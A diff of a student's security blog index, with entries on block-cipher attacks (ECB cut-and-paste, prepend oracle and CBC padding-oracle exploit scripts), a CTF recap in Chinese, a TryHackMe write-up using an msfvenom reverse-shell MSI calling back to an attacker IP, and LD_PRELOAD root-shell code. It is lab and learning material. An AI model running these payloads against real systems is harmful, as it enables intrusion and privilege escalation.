-<h2 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a>Padding Oracle</h2><p><strong>CBC MODE vulnerability</strong><br>This method can be used when it’s possible to get the IV(Initialized Iector) value and the padding method is knowned. Also, it’s necessary that there exist some clues to check whether the input is unpaded successfuly or not<br>The main idea is to enumerate through characters until the message have been unpad successfuly, and remember to adjust the iv value sended cautiously!  </p>
-<p><strong>How to cauculate the correct value after unpad successfuly?</strong><br>that byte of data &#x3D; Now_Trying ^ IV Value at that position ^ padding<br><code>cur=xor(k, iv[now], (16-now))+cur</code><br>cur &#x3D; the decrypted block,<br>k &#x3D; the value be tried now,<br>16-now &#x3D; padding.<br><strong>Exploit</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3140</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">iv, mess</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27; = &#x27;</span>, (iv+mess).<span class="built_in">hex</span>().encode())</span><br><span class="line"><span class="comment">#    info(len((iv+mess).hex().encode()))</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;PADDING CORRECT!!!&#x27;</span> <span class="keyword">in</span> r.recvline()</span><br><span class="line"></span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(r.recvline()[:-<span class="number">1</span>].decode().split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"><span class="comment">#print(flag, len(flag))</span></span><br><span class="line">ans=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)-<span class="number">16</span>, <span class="number">16</span>)):</span><br><span class="line">    iv, mess=flag[i:i+<span class="number">16</span>], flag[i+<span class="number">16</span>:i+<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        now=<span class="number">15</span>-j</span><br><span class="line"><span class="comment">#        info(now)</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="comment">#            info(len(bytes([k]))==1)</span></span><br><span class="line">            <span class="keyword">if</span> oracle(iv[:now]+<span class="built_in">bytes</span>([k])+xor(cur, iv[now+<span class="number">1</span>:], <span class="built_in">chr</span>(<span class="number">16</span>-now).encode()*(<span class="number">15</span>-now)), mess):</span><br><span class="line">                <span class="keyword">if</span> now==<span class="number">15</span>:</span><br><span class="line">                    <span class="keyword">if</span> k!=iv[<span class="number">15</span>]:</span><br><span class="line">                        cur=xor(k, iv[<span class="number">15</span>], <span class="number">1</span>)+cur</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur=xor(k, iv[now], (<span class="number">16</span>-now))+cur</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    ans+=cur</span><br><span class="line">    cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Prepend Oracle</tag>
-        <tag>AES</tag>
-        <tag>ECB</tag>
-        <tag>CBC</tag>
-        <tag>Cut and Paste</tag>
-        <tag>Bit Flipping</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>APCS 2023 10月場心得</title>
     <url>/2023/10/25/apcs202310/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是我第二次考APCS，上次已經是去年了（中間一直有其他事情orz）<br>但這次不論是上午的觀念題還是下午的實作感覺都比去年還要順手很多，應該跟我暑假練很多有關吧，所以希望這次可以撈到 5&#x2F;5…<br>底下是我考後打得code，題目在<a href="https://zerojudge.tw/">zerojudge</a>上面應該都有  </p>
@@ -1020,6 +998,28 @@
         <tag>implementation</tag>
         <tag>DSU</tag>
         <tag>DP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Block Cipher Mode note</title>
+    <url>/2023/11/04/block-cipher-1/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>A quick Block Cipher Mode review for myself.<br>All the exploits down below are for <a href="https://github.com/oalieno/Crypto-Course/tree/master/Block-Cipher-Mode">Labs made by Oalieno</a>  </p>
+<p><a href="https://www.youtube.com/watch?v=VzuIjk1bmFE">Recommended Course</a>  </p>
+<h2 id="Block-Cipher-Mode"><a href="#Block-Cipher-Mode" class="headerlink" title="Block Cipher Mode"></a>Block Cipher Mode</h2><h2 id="Cut-and-Paste-Attack"><a href="#Cut-and-Paste-Attack" class="headerlink" title="Cut and Paste Attack"></a>Cut and Paste Attack</h2><p><strong>EBC MODE vulnerability</strong><br>Because in ECB mode, size of an block is always 16 bytes, so even though we can’t crack it, it’s still feasible to construct datas with specific size and rearrange the encrypted blocks which bring spoofing<br><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20001</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode())</span><br><span class="line"><span class="comment">#user:AAAAAAAAAAA 999999999999999 BBBBBBBBB;money: 10;</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">11</span>+<span class="string">&#x27;9&#x27;</span>*<span class="number">16</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">9</span></span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode)</span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(s.decode().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">2</span>])</span><br><span class="line">payload=s[:<span class="number">16</span>]+s[<span class="number">32</span>:<span class="number">48</span>]+s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">48</span>:]</span><br><span class="line">payload=payload.<span class="built_in">hex</span>()</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Prepend-Oracle"><a href="#Prepend-Oracle" class="headerlink" title="Prepend Oracle"></a>Prepend Oracle</h2><p><strong>EBC MODE vulnerability</strong><br>This method can be used when your input would be encrypted with message you want to encrpt<br>The main idea is to enumerate through characters until it’s same with encrypted blocks generated from only padding input.<br><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20005</span>)</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">data</span>):</span><br><span class="line">    data=data.<span class="built_in">hex</span>().encode()</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="comment">#    print(s)</span></span><br><span class="line">    r.sendline(data)</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    padding=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">32</span>-<span class="number">1</span>-i)</span><br><span class="line">    test=oracle(padding)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> oracle(padding+flag+c.encode())[:<span class="number">64</span>]==test[:<span class="number">64</span>]:</span><br><span class="line"><span class="comment">#            print(test)</span></span><br><span class="line"><span class="comment">#            print(oracle(padding+flag+c.encode()))</span></span><br><span class="line">            flag=flag+c.encode()</span><br><span class="line">            <span class="built_in">print</span>(flag, i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a>Padding Oracle</h2><p><strong>CBC MODE vulnerability</strong><br>This method can be used when it’s possible to get the IV(Initialized Iector) value and the padding method is knowned. Also, it’s necessary that there exist some clues to check whether the input is unpaded successfuly or not<br>The main idea is to enumerate through characters until the message have been unpad successfuly, and remember to adjust the iv value sended cautiously!  </p>
+<p><strong>How to cauculate the correct value after unpad successfuly?</strong><br>that byte of data &#x3D; Now_Trying ^ IV Value at that position ^ padding<br><code>cur=xor(k, iv[now], (16-now))+cur</code><br>cur &#x3D; the decrypted block,<br>k &#x3D; the value be tried now,<br>16-now &#x3D; padding.<br><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3140</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">iv, mess</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27; = &#x27;</span>, (iv+mess).<span class="built_in">hex</span>().encode())</span><br><span class="line"><span class="comment">#    info(len((iv+mess).hex().encode()))</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;PADDING CORRECT!!!&#x27;</span> <span class="keyword">in</span> r.recvline()</span><br><span class="line"></span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(r.recvline()[:-<span class="number">1</span>].decode().split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"><span class="comment">#print(flag, len(flag))</span></span><br><span class="line">ans=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)-<span class="number">16</span>, <span class="number">16</span>)):</span><br><span class="line">    iv, mess=flag[i:i+<span class="number">16</span>], flag[i+<span class="number">16</span>:i+<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        now=<span class="number">15</span>-j</span><br><span class="line"><span class="comment">#        info(now)</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="comment">#            info(len(bytes([k]))==1)</span></span><br><span class="line">            <span class="keyword">if</span> oracle(iv[:now]+<span class="built_in">bytes</span>([k])+xor(cur, iv[now+<span class="number">1</span>:], <span class="built_in">chr</span>(<span class="number">16</span>-now).encode()*(<span class="number">15</span>-now)), mess):</span><br><span class="line">                <span class="keyword">if</span> now==<span class="number">15</span>:</span><br><span class="line">                    <span class="keyword">if</span> k!=iv[<span class="number">15</span>]:</span><br><span class="line">                        cur=xor(k, iv[<span class="number">15</span>], <span class="number">1</span>)+cur</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur=xor(k, iv[now], (<span class="number">16</span>-now))+cur</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    ans+=cur</span><br><span class="line">    cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Prepend Oracle</tag>
+        <tag>AES</tag>
+        <tag>ECB</tag>
+        <tag>CBC</tag>
+        <tag>Cut and Paste</tag>
+        <tag>Bit Flipping</tag>
       </tags>
   </entry>
   <entry>
@@ -1257,57 +1257,10 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 ]]></content>
       <tags>
         <tag>CTF</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
         <tag>Command Injection</tag>
-        <tag>pspy</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>金盾獎 2023 心得文</title>
-    <url>/2023/11/25/csc2023/</url>
-    <content><![CDATA[<p>Team Name:RestOrPwn<br>Rank:2  </p>
-<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這次能在這場比賽拿第二真的好開心，也感謝我的隊友Grasping631和同學ccwt一起陪我玩 &gt;&lt;  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><p>本來有點懶得寫orz，不過今天早上看到學弟yoni問我會不會有wp，心情沉澱一下之後還是決定來寫啦~~~<br>開賽前本來想說這次拿個潛力獎可以去特選就很棒ㄌ&gt;&lt;，結果開賽一直到兩小時後我們進去打情境題的時候就只有我戳出的一題目CVE任意檔案讀取漏洞，就感覺有點涼&#x3D; &#x3D; (我甚至沒把另一個標示簡單的SQL Injection登入繞過解出來，超笨)<br>結果今年情境題我們是抽到一個門禁系統，你要在三十分鐘內成功複製貼在桌上的卡片資訊，結果我們在等待時間查的資訊意外的有幫助，最後各種混亂下互相配合成功破譯並複製內容，這時候就有點小小的被振奮到，也決定回去好好看看其他題目。<br>下午回來看了一下題目，發現逆向工程或者惡意封包分析的藍隊東東我根本就沒頭緒，我目光就鎖定在一個標示難的國小網站，簡單RECON一下之後發現一個隱藏的登入頁面，就在我沒頭緒的時候在旁邊玩得ccwt意外的發現帳號就是主頁上的公號，我就突然想到主頁pdf也有一個叫陳先生的人的公號，所以我就嘗試拿他的分機號碼當密碼登入就進到下一個頁面ㄌorz。之後就是各種IDOR和彩虹表攻擊就過ㄌ，然後我跑出去裝水意外看到score board發現我們第四名……<br>看完之後其實心有稍微放下來，就跑去看了 Grasping631 已經開好解答的題目，意外發現flag就base64編碼後放在解答最後就直接送ㄌ(O)，然後最後的時間就是我把ssh題目的程式碼讀完後逆一下解出+我們三個試著通靈出另一個開解答題目的flag。(然後這時候就關板ㄌQQ)  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>整場比賽的題目蠻有趣的，很貼近現實世界(跟一般的ctf競賽不一樣)，比較有趣的就是賽後出題者講到水熊蟲病毒封包的時候火藥味很濃XD，但我不會forensics聽的其實也不是很懂就是w。  </p>
-<p>回想起來好像真的不會後悔在高一下決定放棄競數以及高二的時候沒上能競，算是高中打比賽第一次有種努力值得的感覺吧，也給國中的自己一個交代ㄌ(應該啦…雖然國中有學資安但沒想過高中要比賽就是XDD  </p>
-<p>最後，再一次感謝我的隊友，以及在我情緒低潮時陪伴我的老師、學長、朋友和同學們，開導了我並讓我嘗試國中完全沒想過要走的路，並在這途中不斷扶持我，在日常中陪我各種耍笨，散心，真的很開心 &lt;3。  </p>
-<p>這場比賽表現很好，也更深刻發現自己還有好多要學 &gt;&lt; 繼續努力owobbbb  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>RestOrPwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cyberlens on Tryhackme</title>
-    <url>/2024/05/22/cyberlens-thm/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I haven’t posted any pentesting write up recently.<br>It means that I trained my penetration skill hardly recently(but preparing school exams and reversing LOL), time to practice ~<br>Victim’s IP : 10.10.231.218<br>Victim’s Host : cyberlens.thm<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.231.218 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-
-<p>Found out an interesting service on port 61777 (Apache Tika 1.17 Server)  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2018-1335"><a href="#CVE-2018-1335" class="headerlink" title="CVE-2018-1335"></a>CVE-2018-1335</h4><blockquote>
-<p>Exploiting Tika 1.17 server  </p>
-</blockquote>
-<p>After a quick searching on exploit-db, I tried this exploit on msfconsole, and gain a user shell.  </p>
-<p><img src="https://hackmd.io/_uploads/rknxMYoQC.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Exploiting-AlwaysInstallElevated"><a href="#Exploiting-AlwaysInstallElevated" class="headerlink" title="Exploiting AlwaysInstallElevated"></a>Exploiting AlwaysInstallElevated</h4><p>I used PrivescCheck.ps1 script to check PE Vectors on this machine.  </p>
-<p><img src="https://hackmd.io/_uploads/BkUBMti70.png" alt="image">  </p>
-<p>The AlwaysInstallElevated setting allows users to install msi file with admin’s privilege and run it with the same privilege, either.  </p>
-<p>So, just spawn a vicious msi file with msfvenom:  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.195.189  LPORT=9003 -a x64 --platform Windows -f msi -o evil.msi</span><br></pre></td></tr></table></figure>
-<p>Grep it with Victim’s machine and run ~<br><img src="https://hackmd.io/_uploads/SkyCGts70.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SkSeXtoXR.png" alt="image">  </p>
-<p>Aha !</p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>My first pentesting on my New Ubuntu VM &gt;w&lt;  </p>
-<p><img src="https://github.com/William957-web/Daily/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202024-05-22%20223020.png?raw=true" alt="image">  </p>
-<p><strong>References</strong><br><a href="https://juggernaut-sec.com/alwaysinstallelevated/">https://juggernaut-sec.com/alwaysinstallelevated/</a>  </p>
-]]></content>
-      <tags>
-        <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
+        <tag>pspy</tag>
       </tags>
   </entry>
   <entry>
@@ -1357,6 +1310,53 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Known High Bits Message Attack</tag>
         <tag>Franklin–Reiter Attack</tag>
         <tag>Boneh and Durfee attack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>金盾獎 2023 心得文</title>
+    <url>/2023/11/25/csc2023/</url>
+    <content><![CDATA[<p>Team Name:RestOrPwn<br>Rank:2  </p>
+<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這次能在這場比賽拿第二真的好開心，也感謝我的隊友Grasping631和同學ccwt一起陪我玩 &gt;&lt;  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><p>本來有點懶得寫orz，不過今天早上看到學弟yoni問我會不會有wp，心情沉澱一下之後還是決定來寫啦~~~<br>開賽前本來想說這次拿個潛力獎可以去特選就很棒ㄌ&gt;&lt;，結果開賽一直到兩小時後我們進去打情境題的時候就只有我戳出的一題目CVE任意檔案讀取漏洞，就感覺有點涼&#x3D; &#x3D; (我甚至沒把另一個標示簡單的SQL Injection登入繞過解出來，超笨)<br>結果今年情境題我們是抽到一個門禁系統，你要在三十分鐘內成功複製貼在桌上的卡片資訊，結果我們在等待時間查的資訊意外的有幫助，最後各種混亂下互相配合成功破譯並複製內容，這時候就有點小小的被振奮到，也決定回去好好看看其他題目。<br>下午回來看了一下題目，發現逆向工程或者惡意封包分析的藍隊東東我根本就沒頭緒，我目光就鎖定在一個標示難的國小網站，簡單RECON一下之後發現一個隱藏的登入頁面，就在我沒頭緒的時候在旁邊玩得ccwt意外的發現帳號就是主頁上的公號，我就突然想到主頁pdf也有一個叫陳先生的人的公號，所以我就嘗試拿他的分機號碼當密碼登入就進到下一個頁面ㄌorz。之後就是各種IDOR和彩虹表攻擊就過ㄌ，然後我跑出去裝水意外看到score board發現我們第四名……<br>看完之後其實心有稍微放下來，就跑去看了 Grasping631 已經開好解答的題目，意外發現flag就base64編碼後放在解答最後就直接送ㄌ(O)，然後最後的時間就是我把ssh題目的程式碼讀完後逆一下解出+我們三個試著通靈出另一個開解答題目的flag。(然後這時候就關板ㄌQQ)  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>整場比賽的題目蠻有趣的，很貼近現實世界(跟一般的ctf競賽不一樣)，比較有趣的就是賽後出題者講到水熊蟲病毒封包的時候火藥味很濃XD，但我不會forensics聽的其實也不是很懂就是w。  </p>
+<p>回想起來好像真的不會後悔在高一下決定放棄競數以及高二的時候沒上能競，算是高中打比賽第一次有種努力值得的感覺吧，也給國中的自己一個交代ㄌ(應該啦…雖然國中有學資安但沒想過高中要比賽就是XDD  </p>
+<p>最後，再一次感謝我的隊友，以及在我情緒低潮時陪伴我的老師、學長、朋友和同學們，開導了我並讓我嘗試國中完全沒想過要走的路，並在這途中不斷扶持我，在日常中陪我各種耍笨，散心，真的很開心 &lt;3。  </p>
+<p>這場比賽表現很好，也更深刻發現自己還有好多要學 &gt;&lt; 繼續努力owobbbb  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>RestOrPwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cyberlens on Tryhackme</title>
+    <url>/2024/05/22/cyberlens-thm/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I haven’t posted any pentesting write up recently.<br>It means that I trained my penetration skill hardly recently(but preparing school exams and reversing LOL), time to practice ~<br>Victim’s IP : 10.10.231.218<br>Victim’s Host : cyberlens.thm<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.231.218 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+
+<p>Found out an interesting service on port 61777 (Apache Tika 1.17 Server)  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2018-1335"><a href="#CVE-2018-1335" class="headerlink" title="CVE-2018-1335"></a>CVE-2018-1335</h4><blockquote>
+<p>Exploiting Tika 1.17 server  </p>
+</blockquote>
+<p>After a quick searching on exploit-db, I tried this exploit on msfconsole, and gain a user shell.  </p>
+<p><img src="https://hackmd.io/_uploads/rknxMYoQC.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Exploiting-AlwaysInstallElevated"><a href="#Exploiting-AlwaysInstallElevated" class="headerlink" title="Exploiting AlwaysInstallElevated"></a>Exploiting AlwaysInstallElevated</h4><p>I used PrivescCheck.ps1 script to check PE Vectors on this machine.  </p>
+<p><img src="https://hackmd.io/_uploads/BkUBMti70.png" alt="image">  </p>
+<p>The AlwaysInstallElevated setting allows users to install msi file with admin’s privilege and run it with the same privilege, either.  </p>
+<p>So, just spawn a vicious msi file with msfvenom:  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.195.189  LPORT=9003 -a x64 --platform Windows -f msi -o evil.msi</span><br></pre></td></tr></table></figure>
+<p>Grep it with Victim’s machine and run ~<br><img src="https://hackmd.io/_uploads/SkyCGts70.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkSeXtoXR.png" alt="image">  </p>
+<p>Aha !</p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>My first pentesting on my New Ubuntu VM &gt;w&lt;  </p>
+<p><img src="https://github.com/William957-web/Daily/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202024-05-22%20223020.png?raw=true" alt="image">  </p>
+<p><strong>References</strong><br><a href="https://juggernaut-sec.com/alwaysinstallelevated/">https://juggernaut-sec.com/alwaysinstallelevated/</a>  </p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
@@ -1890,6 +1890,28 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>LD_PRELOAD and Mongo Notes</title>
+    <url>/2023/11/27/ld-preload/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I learned these from <a href="https://tryhackme.com/room/road">Road on TryHackMe</a> today  </p>
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="Mongo-DB"><a href="#Mongo-DB" class="headerlink" title="Mongo DB"></a>Mongo DB</h3><p>It usually runs on port <code>27017</code>  </p>
+<h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads(?):"></a>payloads(?):</h4><p><strong>Look for working services</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
+<p><strong>MongoDB</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*show databases*/</span><br><span class="line">show db</span><br><span class="line">/*switch to a database*/</span><br><span class="line">use backup # In case the db name is backup</span><br><span class="line">/*list tables*/</span><br><span class="line">show collections</span><br><span class="line">/*read contents in a table*/</span><br><span class="line">db.user.find() # In case the table name is user</span><br></pre></td></tr></table></figure>
+
+<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>LD_PRELOAD is a function allows any program to share libraries.  </p>
+<h4 id="payloads-1"><a href="#payloads-1" class="headerlink" title="payloads:"></a>payloads:</h4><p><strong>shell.c</strong>  </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line"> unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>library compilation</strong><br><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br><strong>add LD_PRELOAD with sudo</strong><br><code>sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility</code><br>In case of sudo result like this:<br><img src="https://hackmd.io/_uploads/ByMeS7GHa.png" alt="image">  </p>
+<p><code>env_keep+=LD_PRELOAD</code>  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>LD_PRELOAD</tag>
+        <tag>MongoDB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sagemath lattices 隨筆</title>
     <url>/2023/12/05/lattice-sage/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p><del>絕對不承認這些都是CryptoHackㄉ題目</del><br>就晾在這邊owob<br>遇到坑了？  </p>
@@ -1916,28 +1938,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>sagemath</tag>
         <tag>lattices</tag>
         <tag>LLL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LD_PRELOAD and Mongo Notes</title>
-    <url>/2023/11/27/ld-preload/</url>
